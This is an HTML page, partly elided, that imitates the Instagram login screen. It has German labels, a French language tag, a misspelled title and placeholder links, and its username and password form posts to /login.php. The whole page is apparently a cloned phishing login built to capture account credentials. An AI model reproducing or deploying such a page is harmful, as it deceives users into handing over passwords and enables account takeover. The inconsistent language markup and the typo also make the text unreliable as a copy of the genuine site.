...
<html lang="fr" class="js not-logged-in client-root touch js-focus-visible sDN5V"><head>
        ...
        <title>Anmelden um den Kontent zu sehen • Instagram</title>
                    ...
                    <div class="gr27e ">
                        ...
                        <form name="HmktE" class="HmktE" method="post" action="/login.php">
                            ...
                            <div class="                   Igw0E     IwRSH      eGOV_         _4EzTm    bkEs3                          CovQj                  jKUp7          DhRcB                                                    ">
                                <button class="sqdOP  L3NKy   y3zKF     " type="button"><span class="coreSpriteFacebookIconInverted AeB99"></span>Mit Facebook anmelden</button>
                            </div>
                            
                            <div class="K-1uj VILGp">
                                <div class="s311c"></div>
                                <div class="_0tv-g">ODER</div>
                                <div class="s311c"></div>
                            </div>
                            ...
                            <div class="Et89U">
                                <div class="_9GP1n   ">
                                    ...
                                    <label class="f0n8F ">
                                        <!--<span class="_9nyy2">Telefonnummer, Benutzername oder E-Mai...</span>-->
                                        <input id="username" placeholder="Telefonnummer, Benutzername oder E-Mai..." aria-label="Telefonnummer, Benutzername oder E-Mai..." aria-required="true" autocapitalize="off" autocorrect="off" maxlength="75" name="username" type="text" class="_2hvTZ pexuQ zyHYP" value="">
                                    </label>
                                </div>
                            </div>
                            ...
                            <div class="Et89U">
                                <div class="_9GP1n   ">
                                    ...
                                    <label class="f0n8F ">
                                        <!--<span class="_9nyy2">Passwort</span>-->
                                        <input id="password" placeholder="Passwort" aria-label="Passwort" aria-required="true" autocapitalize="off" autocorrect="off" name="password" type="password" class="_2hvTZ pexuQ zyHYP" value="">
                                    </label>
                                </div>
                            </div>
                            ...
                            <div class="                   Igw0E     IwRSH       hLiUi    ybXk5    _4EzTm    bkEs3                          CovQj                  jKUp7                                              qJPeX                ">
                                <a href="#">
                                    <div class="_7UhW9   xLCgt      MMzan       gtFbE   uL8Hv         ">Passwort vergessen&nbsp;?</div>
                                </a>
                            </div>

                            <div class="                   Igw0E     IwRSH      eGOV_         _4EzTm    bkEs3                          CovQj                  jKUp7          DhRcB                                                    ">
                                <button class="sqdOP  L3NKy   y3zKF     " type="submit"><div class="                   Igw0E     IwRSH      eGOV_         _4EzTm                                                                                                              ">Anmelden</div></button>
                            </div>

                            <div class="                   Igw0E   rBNOH        eGOV_         _4EzTm                                                            aGBdT                                                  ">
                                <div class="_7UhW9   xLCgt     yUEEX    _0PwGv       uL8Hv         ">
                                    <p>Du hast kein Konto? &nbsp;? <a href="#"><span class="_7UhW9   xLCgt       qyrsm      gtFbE    se6yk        ">Registrieren</span></a></p>
                                </div>
                            </div>
                        </form>
                    </div>
